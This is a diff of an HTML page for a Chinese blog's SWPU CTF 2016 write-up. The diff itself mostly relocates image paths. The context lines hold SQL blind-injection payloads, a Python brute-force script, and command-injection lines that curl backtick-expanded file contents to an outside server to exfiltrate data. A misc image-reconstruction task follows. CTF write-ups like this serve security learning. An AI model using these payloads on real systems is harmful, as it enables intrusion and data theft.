@@ -23,16 +23,16 @@
 <meta property="og:url" content="http://heartsky.info/2016/10/31/SWPU-CTF-2016-writeup/index.html">
 <meta property="og:site_name" content="HeartSky&#39;s blog">
 <meta property="og:description" content="上周打了下西南石油大学的 SWPU，web 题质量还是不错的，学到了很多东西 (还认识了西南石油的 answer 师傅，好开心(≧∇≦)/ web50没什么好说的，flag 在源码里，f12 就看到了 web100打开后出现提示 Tips1: include.php,访问下又出现了提示 Tips: the parameter is file! :)，源码里又发现了 upload.php 访问 up">
-<meta property="og:image" content="http://heartsky.info/SWPUCTF/001.jpg233.jpg">
-<meta property="og:image" content="http://heartsky.info/SWPUCTF/002.jpg002.jpg">
-<meta property="og:image" content="http://heartsky.info/SWPUCTF/003.jpg">
-<meta property="og:image" content="http://heartsky.info/SWPUCTF/004.jpg">
-<meta property="og:image" content="http://heartsky.info/SWPUCTF/005.jpg">
-<meta property="og:updated_time" content="2018-10-26T06:06:01.495Z">
+<meta property="og:image" content="http://heartsky.info/images/SWPUCTF/001.jpg233.jpg">
+<meta property="og:image" content="http://heartsky.info/images/SWPUCTF/002.jpg002.jpg">
+<meta property="og:image" content="http://heartsky.info/images/SWPUCTF/003.jpg">
+<meta property="og:image" content="http://heartsky.info/images/SWPUCTF/004.jpg">
+<meta property="og:image" content="http://heartsky.info/images/SWPUCTF/005.jpg">
+<meta property="og:updated_time" content="2018-10-26T06:08:42.429Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SWPU-CTF-2016-writeup | HeartSky&#39;s blog">
 <meta name="twitter:description" content="上周打了下西南石油大学的 SWPU，web 题质量还是不错的，学到了很多东西 (还认识了西南石油的 answer 师傅，好开心(≧∇≦)/ web50没什么好说的，flag 在源码里，f12 就看到了 web100打开后出现提示 Tips1: include.php,访问下又出现了提示 Tips: the parameter is file! :)，源码里又发现了 upload.php 访问 up">
-<meta name="twitter:image" content="http://heartsky.info/SWPUCTF/001.jpg233.jpg">
+<meta name="twitter:image" content="http://heartsky.info/images/SWPUCTF/001.jpg233.jpg">
     
     
     
@@ -228,22 +228,22 @@ classes that you can use:
 <p>问题解决，下面开始注入，先用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos;=(select(1)from(admin)where(length(passwd)&gt;10))=&apos;0&amp;passwd=test</span><br><span class="line">uname=&apos;=(select(1)from(admin)where(length(passwd)&gt;20))=&apos;0&amp;passwd=test</span><br></pre></td></tr></table></figure></p>
 <p>手工测试出 passwd 的长度为 32，那么应该是 32 位的 md5 值，字符范围为 0-9 a-f<br>然后是盲注最后一个字符的语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos;=(select(1)from(admin)where((substring((passwd)from(32)))=&apos;f&apos;))=&apos;0&amp;passwd=test</span><br></pre></td></tr></table></figure></p>
 <p>写一个盲注脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'1234567890abcdef'</span>:</span><br><span class="line">		length = <span class="number">32</span> - i</span><br><span class="line">		payload = &#123;<span class="string">"uname"</span>:<span class="string">"uname=233'=(select(1)from(admin)where(substring((passwd)from("</span> + str(length) + <span class="string">")))='"</span> + str(j) + str(flag) + <span class="string">"')='"</span>,<span class="string">"passwd"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">		r = requests.post(<span class="string">'http://web1.08067.me/login.php'</span>,data = payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			flag = str(j) + flag</span><br><span class="line">			<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
-<p>得到 passwd <code>c12366feb7373bf6d869ab7d581215cf</code><br><img src="http://heartsky.info/SWPUCTF/001.jpg233.jpg" alt="001.jpg"></p>
+<p>得到 passwd <code>c12366feb7373bf6d869ab7d581215cf</code><br><img src="http://heartsky.info/images/SWPUCTF/001.jpg233.jpg" alt="001.jpg"></p>
 <p>经过 md5 查询得到 <code>1234567mn</code></p>
-<p>然后登录系统<br><img src="http://heartsky.info/SWPUCTF/002.jpg002.jpg" alt="002.jpg"></p>
+<p>然后登录系统<br><img src="http://heartsky.info/images/SWPUCTF/002.jpg002.jpg" alt="002.jpg"></p>
 <p>可以执行 shell 命令，但是过滤了空格，而且执行成功没有回显，只会提示<code>命令执行成功！！</code></p>
 <p>空格可以用<tab>替换，回显可以 curl 执行的结果到自己服务器上，又学到了新姿势～(反引号 <strong>`</strong> 是用来将一个命令的标准输出插在命令行中的任意位置，也就是说会先执行反引号内的命令，然后替换成执行结果)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ord=curl    http://xxx/`ls  |   head    -n  1`</span><br><span class="line">ord=curl    http://xxx/`ls  |   head    -n  2`</span><br></pre></td></tr></table></figure></tab></p>
 <p>依次获取当前目录下的文件(夹)名，这里可以用 burp 跑<br>在服务器的 access_log 文件里可以看到访问记录，关于日志文件的解释可以查看这篇文章 <a href="http://blog.csdn.net/zhuying_linux/article/details/6773912" target="_blank" rel="external">http://blog.csdn.net/zhuying_linux/article/details/6773912</a></p>
-<p>最后 flag 在<code>../../</code>下<br><img src="http://heartsky.info/SWPUCTF/003.jpg" alt="003.jpg"></p>
+<p>最后 flag 在<code>../../</code>下<br><img src="http://heartsky.info/images/SWPUCTF/003.jpg" alt="003.jpg"></p>
 <p>构造如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord=curl	http://119.29.138.57/`cat	../../flag`</span><br></pre></td></tr></table></figure></p>
-<p>获得 flag<br><img src="http://heartsky.info/SWPUCTF/004.jpg" alt="004.jpg"></p>
+<p>获得 flag<br><img src="http://heartsky.info/images/SWPUCTF/004.jpg" alt="004.jpg"></p>
 <p>这道题还是学到了不少知识的，感谢大牛的 wp</p>
 <h3 id="misc150"><a href="#misc150" class="headerlink" title="misc150"></a>misc150</h3><p>第一步是从数据包中导出 flag.zip，这一步很简单，但是下面就懵逼了，解压 zip 得到 ce.txt，打开后一看一堆这样的数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">254, 255, 255</span><br><span class="line">252, 253, 253</span><br><span class="line">197, 198, 198</span><br><span class="line">46, 47, 47</span><br><span class="line">12, 13, 13</span><br><span class="line">62, 63, 63</span><br><span class="line">213, 214, 214</span><br><span class="line">254, 255, 255</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
 <p>完全不知道这是什么东西，等结束后看了下别人的 wp 才知道这是 RGB 三原色的值，可以将 RGB 三原色按照不同的比例相加来产生各种各样的色光，这道题是采用八位二进制数字对应的十进制值来表示的，最小为 0，最大为 255。除此之外还可以用浮点数、百分比来表示，但都是用来表示它们三个的比例</p>
 <p>那么这题就是要还原出一幅图片了<br>首先计算下行数来确定宽和高，可以用 shell 命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat -n ce.txt | tail -n 1</span><br><span class="line">98457	254, 255, 255</span><br></pre></td></tr></table></figure></p>
 <p>98457 = 3 <em> 37 </em> 887 = 117 * 887<br>结合 flag 一般是一长串，确定宽是 887，高是 117</p>
 <p>用 python PIL 中的 Image 模块写个脚本还原<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python2.7</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">x = 887</span><br><span class="line">y = 111</span><br><span class="line">im = Image.new(&apos;RGB&apos;,(x,y))</span><br><span class="line">file = open(&apos;ce.txt&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(0,x):</span><br><span class="line">	for j in range(0,y):</span><br><span class="line">		line = file.readline()</span><br><span class="line">		lst = line.split(&apos;,&apos;)</span><br><span class="line">		im.putpixel((i,j),(int(lst[0]),int(lst[1]),int(lst[2])))</span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(&apos;flag.png&apos;)</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://heartsky.info/SWPUCTF/005.jpg" alt="005.jpg"></p>
+<p><img src="http://heartsky.info/images/SWPUCTF/005.jpg" alt="005.jpg"></p>
 <p>还有几道题，等有空再写吧，这几天事情太多了 = =</p>
 
   </section>
